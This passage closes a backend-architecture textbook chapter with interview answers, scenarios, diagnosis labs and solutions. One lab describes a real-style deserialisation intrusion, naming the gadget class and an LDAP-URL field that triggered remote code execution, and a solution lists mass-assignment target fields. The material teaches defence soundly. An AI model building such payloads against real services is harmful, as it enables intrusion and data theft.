| Integration tests against real engines | Code works with that engine and version in the tested setup | Behaviour under production load and configuration |

---

## Interview Drill

**Q1. What is dependency injection, and why use it?**
A strong answer must mention:
- An object receives its dependencies from outside (preferably through its constructor) instead of creating or looking them up.
- It makes dependencies visible, replaceable (tests pass fakes for the database, clock, payment client) and configurable without code changes.
- Shared resources (connection pools, HTTP clients) are created once and shared, instead of each class creating its own.
- It needs no framework: a composition root in `main` can wire everything by hand; a container automates it.
*Common weak answer:* "It is when Spring puts `@Autowired` objects into your class." That names one framework's syntax, not the mechanism or the problem it solves.

**Q2. What is inversion of control? How does it differ from dependency injection and from the Dependency Inversion Principle?**
A strong answer must mention:
- IoC: the framework controls the flow and calls your code (routing calls handlers, containers build objects, test runners call tests).
- DI: one form of IoC, applied to creating and connecting objects.
- DIP: high-level policy and low-level detail both depend on an abstraction owned by the high-level side; it is about source-code dependency direction.
- They are independent: you can inject a concrete class (DI without DIP) or depend on an interface you instantiate yourself (DIP without DI).
*Common weak answer:* treating the three as synonyms. Interviewers ask precisely to see whether you can separate control flow, object creation and dependency direction.

**Q3. What do the controller, service and repository layers each do? Where do transactions and validation belong?**
A strong answer must mention:
- Controller: HTTP ↔ method calls; binding, shape validation, mapping DTOs; no business decisions, no SQL.
- Service: one method per use case; business rules and orchestration; owns the transaction boundary.
- Repository: collection-like access to domain objects; hides SQL or the ORM; no business rules.
- Transactions in the service because one use case is one unit of work, for every entry point; per-repository transactions split it, controller transactions hold connections too long and miss non-HTTP entry points.
- Validation at three levels: shape at the edge, business rules in the domain, concurrent invariants as database constraints.
*Common weak answer:* "The service layer calls the repository." Describes the arrows but not the responsibilities, and says nothing about where the transaction belongs or why.

**Q4. What is the difference between an entity, a value object and a DTO? Why not return database entities from your API?**
A strong answer must mention:
- Entity: identity that persists while attributes change; equality by ID; guards its own transitions.
- Value object: defined by its values; immutable; validates once (`Money`, `EmailAddress`).
- DTO: plain data shaped for a boundary; no behaviour.
- Returning entities couples the API to the schema, exposes internal fields (excessive data exposure), and binding requests onto them allows mass assignment.
- Serialising ORM entities can trigger lazy loading (N+1 queries) and cycles in bidirectional relations.
*Common weak answer:* "DTOs are just for performance." Their main purposes are decoupling and security.

**Q5. What are singleton, prototype and request scopes? What goes wrong when you mix them?**
A strong answer must mention:
- Singleton: one instance per container; must be stateless or thread-safe. Prototype or transient: new on each resolution. Request: one per HTTP request.
- A captive dependency: a singleton receives a shorter-lived object at construction and keeps it forever (the first request's user or tenant), or a transient becomes shared across threads.
- Fixes: inject a provider and resolve at call time, or a scoped proxy that looks up the current instance per call.
- Symptom: the wrong value is constant until restart, unlike an intermittent race.
*Common weak answer:* "Request scope means the bean is thread-safe." It is per request only when looked up correctly; injected directly into a singleton, it is not per request at all.

**Q6. You are asked to build a minimal DI container. What does `resolve` do?**
A strong answer must mention:
- Look up the registration (factory and scope) for the requested type; fail clearly if missing.
- Return a cached instance for singletons, or the request scope's instance for per-request types.
- Otherwise build it by recursively resolving its constructor dependencies; detect cycles with a "currently resolving" set.
- Cache singletons and per-request instances; never cache transients; track creation order for shutdown in reverse.
- Real containers auto-wire by inspecting constructor parameter types (reflection or build-time code generation).
*Common weak answer:* a map from names to objects with no scopes, cycle detection or lifecycle, which is a service locator, not a container.

**Q7. How does a framework add transactions, security checks or caching to a method that never calls them?**
A strong answer must mention:
- Annotations are metadata; a post-processor reads them at startup when the container creates the component.
- The container wraps the component in a proxy (interface-based or a generated subclass) and injects the proxy in its place.
- Each proxy method calls a handler that runs advice around the real call: begin, call, commit or roll back; check permission; return a cached value.
- This is aspect-oriented programming with run-time weaving: aspects, pointcuts, advice; compile-time and load-time weaving are alternatives.
- The order of advice matters (cache outside or inside the transaction).
*Common weak answer:* "The annotation tells the JVM to start a transaction." The runtime does nothing with the annotation by itself; the proxy does all the work.

**Q8. Why does `@Transactional` (or `@Cacheable`, or `@Async`) sometimes have no effect?**
A strong answer must mention:
- Self-invocation: a call through `this` reaches the raw object and bypasses the proxy's advice.
- Private or final methods cannot be intercepted by proxies; objects built with `new` are not proxied at all.
- For rollback specifically: some frameworks (Spring by default) commit when a checked exception propagates, or the exception is caught inside the method.
- Diagnosis: transaction debug logging, the run-time class name of the injected object, autocommitted statements in database logs.
- Fixes: move the method to another component, use programmatic transactions, or use compile- or load-time weaving.
*Common weak answer:* "The database does not support transactions." The database is fine; the advice never ran.

**Q9. Walk through what happens to a JSON request body, from bytes to a database row and back.**
A strong answer must mention:
- Framing and decoding (Content-Length or chunked, charset, size limits), parsing to tokens or a tree, binding onto a request DTO with type conversion.
- Shape validation (the trust boundary), then mapping into domain commands and value objects, with identity from the authenticated context, never from the body.
- Business logic in the service's transaction; persistence through a repository with parameterised SQL; constraints as the last check.
- Mapping out to a response DTO, serialisation, status and headers (`201` with `Location`).
- The characteristic failure and status of each step.
*Common weak answer:* "The framework converts JSON to an object and saves it." Skips validation, the trust boundary, mapping and every failure point.

**Q10. What is insecure deserialisation, and how do you prevent it?**
A strong answer must mention:
- Input controls which classes are instantiated or which code runs during deserialisation; gadget classes with side effects in constructors, setters or `readObject`; chains lead to remote code execution.
- Native formats (Java serialisation, Python `pickle`, PHP `unserialize`, .NET `BinaryFormatter`) and JSON mappers configured to read class names from input are vulnerable.
- Prevention: data-only formats onto concrete DTOs; polymorphism through logical names and a closed allowlist; no default typing; allowlist filters if a native format is unavoidable.
- Defence in depth: patched libraries, fewer libraries on the classpath, least privilege, egress restrictions, parser limits; sign data that round-trips through clients.
*Common weak answer:* "Validate the input after deserialising it." By then the gadget code has already run.

**Q11. Should a JSON mapper reject unknown fields or ignore them?**
A strong answer must mention:
- Rejecting catches client mistakes (a misspelt field silently becoming null) and makes mass-assignment attempts visible.
- Ignoring (the tolerant reader) lets other services add fields without breaking consumers.
- Common choice: reject on your own public request bodies; ignore when reading other services' responses and events.
- Know your framework's default (Spring Boot's mapper ignores unknown fields).
*Common weak answer:* "Always ignore them for compatibility." That hides client bugs and makes typos silent data loss.

**Q12. Exceptions or result types? How should errors become HTTP responses?**
A strong answer must mention:
- Exceptions propagate automatically and keep the happy path clean but are invisible in signatures; result types are explicit and checked by the compiler but verbose.
- A practical split: expected domain outcomes explicit; bugs and infrastructure failures propagate to one boundary.
- A taxonomy mapped once: `400`/`422` input, `401`, `403`/`404`, `409` conflicts, `429`, `503`/`504` dependencies, `500` bugs; 4xx at info, 5xx at error.
- Translate infrastructure errors in adapters (unique violation → `EmailAlreadyRegistered` → `409`); problem-details bodies (RFC 9457) with a request ID and no internals; log once.
*Common weak answer:* "Catch every exception and return 500 with the message." Misclassifies client errors and leaks internals.

**Q13. A developer catches an exception inside a transactional service method, logs it and continues. What can go wrong?**
A strong answer must mention:
- The method returns normally, so the proxy commits: the work done before the failure is committed without the rest (partial success).
- In frameworks that mark a shared transaction rollback-only, the later commit fails unexpectedly instead ("silently rolled back because it has been marked as rollback-only").
- Optional steps (emails) belong after commit, with their own failure handling (outbox, Chapter 25).
- Only catch what you can actually handle; otherwise let it propagate.
*Common weak answer:* "Catching is safer because the user does not see an error." The user gets a success response for a half-applied operation.

**Q14. How should configuration and secrets reach an application?**
A strong answer must mention:
- Separate configuration from code; build one artifact and supply environment-specific values from outside (twelve-factor).
- Layered sources with precedence (defaults, files, profile files, environment variables, arguments).
- Bind into typed objects and validate at startup; fail fast instead of falling back to development defaults.
- Secrets through environment variables, mounted files or a secret manager, each with trade-offs; never logged; rotatable; a leaked secret is rotated, not just deleted from the repository.
*Common weak answer:* "Put them in `application.properties` with a different file per environment, committed to git." Puts production secrets in version control history.

**Q15. Layered versus hexagonal architecture: what problem does hexagonal solve, and what does it cost?**
A strong answer must mention:
- In layered designs business logic depends downward on data access and, transitively, on infrastructure.
- Hexagonal: the core defines ports; driving adapters call in; driven adapters implement outbound ports; source dependencies point inward (the dependency rule of clean architecture).
- Benefits: core testable without infrastructure, several entry points reuse use cases, volatile integrations isolated.
- Costs: more interfaces, separate models and mapping, indirection; little value for thin CRUD services; databases rarely truly swappable.
*Common weak answer:* "Hexagonal lets you swap your database easily." The realistic benefit is testability and isolation of integrations.

**Q16. Monolith versus microservices: what are the trade-offs? What are a modular monolith and a distributed monolith?**
A strong answer must mention:
- Monolith: one deployable, in-process calls, one transaction possible, simple operations; but shared release, whole-app scaling, coupling risk.
- Microservices: independent deployment, scaling and team autonomy; but network latency, partial failure, unknown outcomes, no cross-service transactions, high operational cost; availability multiplies along synchronous chains (0.999^5 ≈ 99.5%).
- Modular monolith: one deployable with enforced module boundaries and per-module data ownership; a common starting point and a path to later extraction.
- Distributed monolith: separate services that must change and deploy together (shared database, shared domain library, chatty synchronous chains).
- Conway's Law: microservices mainly solve organisational scaling.
*Common weak answer:* "Microservices scale better." Scaling a stateless monolith horizontally is often easy; the main gains are organisational and deployment independence.

**Q17. Why is a database shared between services a problem?**
A strong answer must mention:
- The schema becomes an unowned, unversioned interface: a rename breaks other services, forcing coordinated releases.
- Semantic coupling: different interpretations of the same columns.
- Invariants bypassed: direct writes skip the owning service's rules.
- Runtime coupling: one service's heavy queries, locks or connections hurt the other; a shared failure domain.
- Fix: one owner per table, access through the owner's API or events and local copies; separate schemas and database users with permissions enforcing ownership.
*Common weak answer:* "It is a single point of failure." True but minor; the main problem is coupling that defeats independent change.

**Q18. What is the difference between a unit test and an integration test, and how does architecture affect testability?**
A strong answer must mention:
- Unit: one component with doubles (stubs, fakes, mocks), fast; integration: real infrastructure or the real framework.
- Seams come from constructor injection, ports, an injected clock, typed configuration.
- Unit tests cannot see proxies, binding, error mapping, SQL or constraints; integration tests through the container and against the same database engine (in a container) catch them.
- Over-mocking and substitute databases give false confidence; contract tests guard service boundaries.
*Common weak answer:* "Unit tests test small things, integration tests test big things." Size is not the point; what is real and what is substituted is.

**Q19. Why is constructor injection preferred over field injection?**
A strong answer must mention:
- Required dependencies cannot be missing; the object is complete after construction.
- Fields can be immutable (final), which also helps safe publication across threads (Chapter 5, Section 5.3).
- Dependencies are visible in one place, and too many parameters reveal low cohesion.
- The class can be constructed in a plain test without a container or reflection; constructor cycles fail fast and reveal design problems.
*Common weak answer:* "Field injection is shorter, so it is fine." Shorter, but it hides dependencies and ties tests to the container.

---

## Scenario Exercises

1. A `PATCH /api/users/me` endpoint binds the request body directly onto the `User` database entity and saves it. Its response returns the same entity. A security review is scheduled for tomorrow. List the attacks the reviewers will try, what each would achieve, and the redesign you will propose.
2. A `RatesService` has `convert(amount, from, to)`, which calls `this.getRate(from, to)`, annotated `@Cacheable`. The cache dashboard shows a hit ratio of exactly 0%, and the exchange-rate provider is billing for 3 million calls a day. Explain the mechanism and give three fixes with their trade-offs. Then explain what changes if `getRate` is later made per-customer (negotiated rates).
3. The orders and shipping services share one PostgreSQL database. Shipping wants to rename `orders.address` to `orders.shipping_address` and add an index on a 200-million-row table during working hours. Describe what will happen to the orders service, and outline a plan that ends with clear data ownership.
4. A four-person start-up asks you whether to build their first product as microservices "so it can scale". Give an argued recommendation, with at least one calculation, and say what would make you change it later.
5. A service reports a 30% `5xx` rate on its dashboard, but the team believes most failures are user mistakes. Describe how you would confirm or refute that belief from logs, and how you would redesign the error handling so the dashboard means something.
6. A team's repository integration tests run against an in-memory database of a different engine and pass. In production, a query using `INSERT ... ON CONFLICT` fails with a syntax error, and a deadlock appears that no test has ever shown. Explain why the tests could not catch either problem, and propose a test strategy.
7. After a routine deploy, the orders service in one region fails readiness with `ECONNREFUSED 127.0.0.1:5432`, while other regions are healthy. Give three hypotheses involving configuration, the evidence that separates them, and the change that would have prevented the incident.

---

## Diagnosis Lab

**Lab 1: Orders without lines after a nightly import**
- *Symptom:* Each morning, a few hundred orders created by the nightly CSV import have no order lines. The import code has `@Transactional` on the method that imports one row, and the team expected a failed row to leave nothing behind.
- *Hypotheses:* (a) the database is not honouring transactions; (b) the transaction is committed early by some other code; (c) no transaction is ever started for the row.
- *Evidence:* With transaction debug logging enabled, the import produces no "Creating new transaction" lines at all, while API requests do. The database's statement log shows each `INSERT` committed on its own (autocommit). In the code, `importAll` loops and calls `this.importOne(row)`; `importOne` carries the annotation. A debugger shows the injected `ImportService` is a proxy class, but the call to `importOne` happens inside the target object.
- *Root cause:* (c). Self-invocation bypasses the proxy, so the advice never runs. Each statement autocommits; when a row's lines fail (an unknown product), the order row is already committed.
- *Fix:* Move `importOne` into a separate `RowImporter` component and inject it, so each call goes through its proxy. Add the missing foreign-key and "order has lines" checks in the import's validation. Clean up the orphan orders with a one-off script after review.
- *Prevention:* An integration test through the container that imports a file with a bad row and asserts that no order exists for it. A code-review rule: no annotated methods called through `this`.

**Lab 2: One tenant's reports appear in another tenant's account**
- *Symptom:* After Monday's deploy, several tenants report seeing another company's data in exported reports. The affected tenants all see the **same** other tenant's data, and the problem began right after the restart.
- *Hypotheses:* (a) a race on a shared field (Chapter 11, Section 11.6); (b) a cache keyed without the tenant; (c) a scope mismatch.
- *Evidence:* Every leaked report belongs to the tenant whose request was the first to hit the reporting endpoint after each instance restarted, and each instance leaks a different tenant: so the wrong value is fixed per instance, not random. A race would be intermittent and mixed. The report cache is keyed by tenant and report ID. The deploy added a new singleton, `ReportExporter`, whose constructor takes a `TenantContext`, a request-scoped component; the container built `TenantContext` once, during the first request, and the singleton kept it.
- *Root cause:* (c). A captive dependency: the singleton holds the first request's tenant context forever.
- *Fix:* Inject a provider of `TenantContext` (or a scoped proxy) and resolve it inside each call. Restart all instances immediately, notify affected tenants, and audit exports since the deploy.
- *Prevention:* A container setting or architecture test that rejects request-scoped dependencies injected into singletons; a multi-tenant integration test that runs two tenants' requests in sequence and checks each response belongs to its caller.

**Lab 3: Application servers connecting to an unknown host**
- *Symptom:* The egress firewall alerts on outbound LDAP connections from two application servers to an unfamiliar internet address. Shortly before, one server shows a shell process running as a child of the application process.
- *Hypotheses:* (a) a compromised dependency calling out; (b) remote code execution through an input; (c) a misconfigured integration.
- *Evidence:* Request logs around the alert show `POST /api/reports/definitions` bodies containing `"com.sun.rowset.JdbcRowSetImpl"` and a `dataSourceName` with an `ldap://` URL. That endpoint stores user-defined report definitions, and its JSON mapper was configured with default typing (class names in the payload) so that arbitrary filter objects could be saved. The mapper version is several years old and its gadget blocklist is out of date. The runtime is an older Java version that still allowed remote class loading through directory lookups.
- *Root cause:* (b). Insecure deserialisation: the input chose a gadget class whose setters performed a directory lookup to the attacker's server, which loaded and ran attacker code.
- *Fix (now):* Isolate the affected servers, block the endpoint, and treat everything the process could reach as compromised: rotate the database credentials and API keys in its environment, review data access since the first malicious request. *Fix (lasting):* replace default typing with logical type names and a closed allowlist of filter types; update the mapper and the runtime; remove unused libraries; keep the outbound firewall in deny-by-default mode.
- *Prevention:* Code search in CI for default typing, `Id.CLASS`, native deserialisation and unsafe YAML loading; dependency scanning; egress restrictions on all application hosts.

**Lab 4: Delivery notes silently lost for three weeks**
- *Symptom:* Customer support reports that delivery notes ("leave at the back door") entered in the mobile app never reach the warehouse. The web app's notes arrive. Nothing appears in error logs.
- *Hypotheses:* (a) the mobile app does not send the field; (b) the server drops it; (c) the warehouse integration drops it.
- *Evidence:* A raw request captured at the proxy shows the mobile app sending `"delivery_notes": "..."`; the web app sends `"deliveryNotes": "..."`. The DTO property is `deliveryNotes`. The framework's JSON mapper ignores unknown fields, so `delivery_notes` is skipped and the property stays null. A mobile release three weeks ago switched its JSON library and naming convention.
- *Root cause:* (b), triggered by the client change: a naming mismatch made silent by ignoring unknown fields.
- *Fix:* Configure the public API's request DTOs to reject unknown fields, so a mismatch fails with a `400` naming the field; ask the mobile team to follow the API's naming; temporarily accept both names for already-installed app versions.
- *Prevention:* A published API contract (OpenAPI) and consumer contract tests for the mobile app; a monitoring check on the share of orders with notes by client type, which would have dropped to zero for mobile.

---

## Solution Sketches

1. Attacks: mass assignment of fields only the system should set (`role`, `emailVerified`, `tenantId`, `id`, `passwordHash`, `createdAt`), giving privilege escalation, account takeover or moving data between tenants; excessive data exposure in the response (password hash, internal flags, related objects loaded by the ORM); possibly lazy-loaded relations leaking other users' data. Redesign: an `UpdateProfileRequest` DTO with only `displayName`, `locale` and other user-editable fields, unknown fields rejected; shape validation; a service method that loads the user from the authenticated identity (not from the body) and calls domain methods; a `UserProfileResponse` DTO with explicit fields; changes to email go through a separate verified flow.
2. `convert` calls `getRate` through `this`, so the caching proxy is bypassed on every call (self-invocation). Fixes: (a) move `getRate` into a separate `RateProvider` component with the cache annotation, so calls cross the proxy: clean, the usual answer; (b) cache programmatically inside `convert` with an explicit cache object: explicit, more code; (c) compile- or load-time weaving: works for internal calls, adds build complexity. Per-customer rates: the cache key must include the customer (Chapter 11, Section 11.1), otherwise one customer's negotiated rate is served to others; also consider the cache size, since the key space multiplies.
3. The rename breaks every orders query that names `orders.address` at the moment the migration runs, so the two deployments must be coordinated; the index build may lock writes or consume heavy I/O on the shared server (Chapter 16 covers index builds; some databases can build indexes without blocking writes), slowing order placement. Plan: decide that the orders service owns `orders`; shipping stops reading the table directly and instead uses an orders API or an `OrderPlaced` event stream to maintain its own copy with the columns it needs (Chapter 25); give each service its own schema and database user, removing shipping's grants on `orders`; then each can change its own schema independently, using expand-and-contract migrations (Chapter 18) for its own consumers.
4. Recommend a modular monolith: one deployable, modules by business capability with enforced boundaries and per-module schemas. Calculation: if a checkout needs five services each 99.9% available, the chain gives about 99.5%, roughly 3.6 hours of failure per month instead of about 43 minutes; and four people would run five pipelines, dashboards and on-call rotations. A stateless monolith scales horizontally behind a load balancer (Chapter 10). Change later when a module needs a different scaling or reliability profile, or when teams grow large enough that a shared release blocks them; module boundaries and data ownership make extraction mechanical.
5. Group error log lines by error type and status: if `ValidationFailed`, `NotFound` or domain errors appear with `500`, they are unmapped; if they appear with `4xx` but the dashboard counts `4xx` as failures, the dashboard is wrong. Check a sample of `500` stack traces for bugs versus domain exceptions. Redesign: an error taxonomy with a central mapping (domain errors to `4xx`, infrastructure to `502`/`503`/`504`, bugs to `500`), adapters translating infrastructure exceptions, 4xx logged at info without stack traces, a dashboard and alert on `5xx` only, and a test that every domain error type has a mapping.
6. The substitute engine has its own SQL dialect, locking and isolation behaviour, so a PostgreSQL-specific statement and real lock interactions (Chapter 17) were never exercised. Strategy: run repository and application integration tests against the same engine and major version as production, in a throwaway container with production migrations; keep unit tests for the core with fakes; add a concurrency test for the deadlock-prone path that runs two transactions in parallel; consider testing the migration scripts themselves in CI.
7. Hypotheses: (a) the region's deployment manifest lacks the database URL variable, so the application fell back to a default of `localhost` (evidence: effective configuration printed at startup, the manifest diff); (b) the wrong profile is active in that region, selecting development settings (evidence: the active-profiles startup line); (c) the variable is set but under a misspelt name, so it is ignored (evidence: the environment of the running process versus the expected key names). Prevention: no defaults for environment-specific values, validated typed configuration that fails startup with a message naming the missing key, and a startup log of active profiles and the (masked) effective configuration.

---

**END OF CHAPTER 12**
